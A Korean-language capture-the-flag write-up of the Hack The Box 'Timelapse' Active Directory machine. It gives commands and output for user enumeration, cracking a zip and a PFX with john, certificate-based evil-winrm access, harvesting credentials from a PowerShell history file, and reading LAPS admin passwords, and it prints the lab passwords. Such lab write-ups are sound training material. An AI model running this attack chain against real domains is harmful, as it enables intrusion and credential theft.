# HTB-TIMELAPSE
```bash
OS: Windows(AD)
DATE: 26.10.08
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 포트 검사를 통해 어떤 포트들이 있는지 확인하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 timelapse.htb | tee nmap
```
확인 결과 88, 389 서비스가 운영 중인 것으로 보아 DC 서버인 것을 알 수 있었다. 또한 **5986**이 돌아가는 것으로 보아 WinRM이 HTTPS로 동작하는 것으로 보였다.
그리고 SMB 서비스가 운영 중이기에 nxc로 기본 정보들을 수집하려 시도하였다
```bash
nxc smb IP -u qwer -p '' --users
```
```bash
nxc smb IP -u qwer -p '' --rid-brute
```
시도 결과 --rid-brute 결과가 나왔다. 따라서 user명만 모으는 코드를 사용하였다
```bash
nxc smb IP -u qwer -p '' --rid-brute | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' | tee users
```
따라서 유저명들을 얻게 되었다

## Initial Access
유저명을 얻게 되어 AS-REP Roasting, Kerberoasting을 시도하였다
```bash
nxc ldap timelapse.htb -u user -p '' --asreproast asrep
```
```bash
impacket-GetNPUsers timelapse.htb/ -usersfile user -no-pass -dc-ip IP
```
하지만 아무런 해시값을 얻지 못했다. 따라서 다른 방법으로 smbclient를 사용하여 Guest 계정으로 열거를 시도하였다
```bash
smbclient -L //IP -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share
    Shares          Disk
    SYSVOL          Disk      Logon server share
```
```bash
smbclient //IP/Shares -N
```
Guest 유저로 접속이 가능하여 Shares라는 폴더에 들어가 보았다. 안에는 **Dev**, **HelpDesk**라는 두 개의 폴더가 있었다. 먼저 `/Dev/winrm_backup.zip`을 get 해주고, HelpDesk 안에는 여러 가지 LAPS 관련 docx 파일들이 있었다. 모두 다운로드 받아 확인해 보았다. 확인한 결과 `winrm_backup.zip`은 비밀번호가 걸려 있었다. 따라서 zip2john으로 대상 zip을 해시화해주고 john으로 크랙을 시도하였다
```bash
zip2john winrm_backup.zip > hash.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
크랙 시도 결과 supremelegacy라는 비밀번호를 얻게 되었다. 따라서 그 비번으로 zip 압축을 풀어주었다
```bash
unzip winrm_backup.zip

[winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
```
압축 해제한 결과 **legacyy_dev_auth.pfx**라는 파일을 얻었다. pfx란 인증서 등을 하나로 묶어 비밀번호로 잠근 컨테이너 파일이다. 따라서 개인키와 인증서를 추출하여 WinRM에 접근을 시도하였다. 먼저 개인키부터 추출을 시도하였다
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
```
하지만 이 또한 암호가 걸려 있었다. 따라서 추출하기 위해 [pfx2john](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba#file-pfx2john-py)을 검색하여 툴을 다운받아 다시 한 번 시도하였다
```bash
python3 pfx2john.py legacyy_dev_auth.pfx >pfx.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.txt
```
크랙 결과 `thuglegacy`라는 비밀번호를 얻게 되었다.
따라서 다시 한 번 개인키 추출을 시도하였다
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
```
이번엔 안전히 key.pem을 얻게 되었다. 이후 인증서 또한 추출을 시도하였다
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```
이후 얻은 인증서와 개인키로 WinRM 접속을 시도하였다
```bash
evil-winrm -i IP -c cert.pem -k key.pem -u legacyy
```
하지만 접속하지 못하였다. WinRM이 SSL 인증이 필요하기에 -S 옵션으로 접속하여야 했다
```bash
evil-winrm -i IP -c cert.pem -k key.pem -u legacyy -S
```
하지만 또 접속하지 못하였다. 이유를 알아보니 key.pem을 만들 때 **-nodes** 옵션을 붙이지 않아 개인키를 새 비밀번호로 다시 암호화하려는 문제가 생겼다. 따라서 다시 한 번 키를 만들어주고 접속한 결과 쉘을 얻을 수 있었다
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
```
```bash
evil-winrm -i IP -c cert.pem -k key.pem -u legacyy -S
```

![user](attach_real/Pasted%20image%2020261008153045.png)

따라서 쉘을 얻고 tree로 열거하였다
```ps1
tree /F /A
```
하지만 아무런 정보를 얻지 못하였다. 여기서 `dir -Force` 명령어로 숨김 파일을 확인한 결과 AppData 디렉토리를 발견할 수 있었다. 이후 AppData에 들어가 tree를 통하여 상세 파일들을 확인한 결과 `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`라는 히스토리 파일을 발견할 수 있었다. 따라서 출력한 결과
```ps1
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
라는 결과를 얻게 되었다. 따라서 누군가의 비밀번호를 얻게 되었다. 이후 다른 유저를 확인한 결과 svc_deploy라는 유저를 발견할 수 있었다. 그 유저로 WinRM 접속을 시도한 결과 접속에 성공하였다
```bash
evil-winrm -i IP -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

![svc](attach_real/Pasted%20image%2020261008164048.png)

## Privilege Escalation
더 권한이 있는 쉘로 온 후 whoami /all을 통하여 권한들을 확인하였다
```ps1
whoami /all

Group Name                                  Type             SID                                          Attributes                                                                                                                                         
=========================================== ================ ============================================ ==================================================                                                                                                 
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group                                                                                                 
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group                                                                                                 
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group                                                                                                 
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group                                                                                                 
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                             

Privilege Name                Description                    State                                                            
============================= ============================== =======                                                          
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                          
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                          
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
```
확인 결과 **SeMachineAccountPrivilege** 권한이 있다는 것을 알게 되어 noPac 계열 도구로 취약점 스캔을 한 결과 취약하지 않았다. 이 머신은 패치된 버전이어서 가능하지 않았다. 따라서 권한들을 더 확인한 결과 그룹 **LAPS**를 확인할 수 있었다. LAPS 그룹이기에 **ms-Mcs-AdmPwd** 읽기를 시도하였다. 먼저 [PoC](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps)를 찾아 PowerShell에서 ms-Mcs-AdmPwd를 읽어 평문 비밀번호를 얻게 되었다
```ps1
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

Name ms-Mcs-AdmPwd
---- -------------
DC01 bjz[405q5]/+[kj@,SOECs06
```
따라서 WinRM으로 admin 접속을 시도한 결과 접속에 성공하였다
```bash
evil-winrm -i IP -u Administrator -p 'bjz[405q5]/+[kj@,SOECs06' -S
```
쉘은 얻었지만 일반 데스크톱에 플래그가 없었다. 따라서 더 뒤져본 결과 /TRX라는 디렉토리에서 플래그를 발견할 수 있었다

![root](attach_real/Pasted%20image%2020261009010214.png)


## New Inform
- nmap 포트를 제대로 확인하자. SSL이 있을 수도 있으니 항상 아니라는 생각은 버리자
- zip에 비번이 걸려 있으면 zip2john을 시도하자
- pfx: 인증서 꾸러미. 여러 암호학적 요소를 하나로 묶어 비밀번호로 잠근 컨테이너 파일이다. 안에는 보통 인증서, 개인키, CA 체인 등등이 들어가 있다
- WinRM을 연결하기 위해 인증서와 개인키가 필요하다
- pfx에도 암호가 걸려 있으면 pfx2john으로 해시화해주자
- 뭐든 어떤 프로그램에 암호가 걸려 있으면 2john을 확인
- openssl 도구로 키를 추출할 수 있다
- evil-winrm에 접속할 때 SSL 인증이 필요한 경우 -S 옵션으로 접속해야 한다
- -nodes: 개인키를 추출할 때 꼭 이 옵션을 추가해주자
- 항상 먼저 dir -Force를 하여 숨김 폴더 및 파일을 확인해주자. 그리고 AppData 또한 들어가주자
- 진짜 없을 것 같지만 깊은 곳까지 항상 꼼꼼하게 열거하자
- SeMachineAccountPrivilege 권한이 취약하지 않을 수 있다. 패치가 되어 있을 수 있어
- LAPS: 회사에 PC가 수백 대가 있으면 각 PC마다 로컬 Admin 계정이 있는데, IT팀이 편하게 관리하려고 전부 같은 비밀번호로 설정하는 경우가 많다. 이걸 `Pass-the-Hash lateral movement`의 온상이라고 표현한다. 이걸 방지하기 위해 LAPS는 각 PC의 로컬 관리자 비번을 전부 다르게 랜덤으로 자동 관리한다. 각 PC가 주기적으로 자기 로컬 관리자 비번을 랜덤 생성하고, 그 비번을 AD에 자기 컴퓨터 객체의 속성으로 저장하며, 필요할 때 IT 관리자가 AD에서 그 비번을 조회해서 사용한다
- ms-Mcs-AdmPwd: LAPS 비번이 저장되는 곳이다. 이걸 읽으려면 권한이 필요하다. 그 권한이 LAPS_Readers이다
- 플래그가 원래 위치에 없으면 그냥 더 뒤져라
- WinRM으로 Administrator에 접속해도 세션은 Administrator 권한이지 SYSTEM은 아니다. SYSTEM으로 올라가려면 이미 SYSTEM으로 실행 중인 서비스/프로세스에 올라타야 한다. Administrator 권한이 있다면 `PsExec64.exe -s -i cmd.exe` 등으로 SYSTEM 획득이 가능하다. 다만 이 박스는 root flag가 Administrator 권한만으로 읽혀서 SYSTEM 승격은 필요 없었다